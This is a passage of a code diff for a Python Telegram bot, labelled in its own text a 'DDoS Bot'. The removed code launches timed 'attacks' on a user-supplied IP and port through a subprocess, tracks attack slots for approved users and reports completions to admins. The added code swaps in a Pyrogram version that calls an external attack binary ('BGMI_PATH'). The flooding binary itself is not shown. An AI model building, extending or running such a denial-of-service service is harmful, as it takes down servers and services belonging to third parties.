-                time.sleep(30)
-                # Check if attack still exists
-                with attack_lock:
-                    if attack_id not in active_attacks:
-                        process.kill()
-                        return
-        
-        stdout, stderr = process.communicate(timeout=duration + 10)
-        
-        # Send completion message
-        free_slots = get_free_slots()
-        bot.send_message(
-            chat_id,
-            f"✅ *Attack Completed!*\n\n🎯 Target: {ip}:{port}\n⏰ Duration: {duration}s\n👤 By: @{username}\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free",
-            parse_mode="Markdown"
-        )
-        
-        # Notify admin
-        bot.send_message(
-            ADMIN_IDS[0],
-            f"✅ *Attack Completed*\n🎯 {ip}:{port}\n👤 @{username}\n⏰ {duration}s",
-            parse_mode="Markdown"
-        )
-        
-    except subprocess.TimeoutExpired:
-        process.kill()
-        bot.send_message(ADMIN_IDS[0], f"⚠️ *Attack Timeout*\n🎯 {ip}:{port}\n👤 @{username}", parse_mode="Markdown")
-    except Exception as e:
-        bot.send_message(ADMIN_IDS[0], f"❌ *Attack Failed*\n👤 @{username}\nError: {str(e)}", parse_mode="Markdown")
-    finally:
-        with attack_lock:
-            if attack_id in active_attacks:
-                del active_attacks[attack_id]
-
-# ============================================
-# CLEANUP THREAD
-# ============================================
-
-def cleanup_thread():
-    while True:
-        time.sleep(10)
-        cleanup_old_attacks()
-
-# Start cleanup thread
-cleanup_thread_obj = threading.Thread(target=cleanup_thread, daemon=True)
-cleanup_thread_obj.start()
-
-# ============================================
-# MAIN
-# ============================================
-
 if __name__ == "__main__":
     print("=" * 50)
-    print("🎯 Po Pvt DDoS Bot Starting...")
+    print("🔥 PRIME ONYX PYROGRAM BOT")
     print("=" * 50)
-    print(f"📊 Max Attacks: {MAX_ACTIVE_ATTACKS}")
-    print(f"👑 Admins: {ADMIN_IDS}")
-    print(f"✅ Approved Users: {len(APPROVED_USERS)}")
-    print(f"🟢 Free Slots: {MAX_ACTIVE_ATTACKS}")
+    print(f"📊 Using binary: {BGMI_PATH}")
+    print(f"👑 Owner ID: {OWNER_ID}")
     print("=" * 50)
     print("✅ Bot is running...")
     
-    while True:
-        try:
-            bot.infinity_polling(timeout=60, long_polling_timeout=60)
-        except Exception as e:
-            print(f"Polling error: {e}")
-            time.sleep(15)
+    app.run()
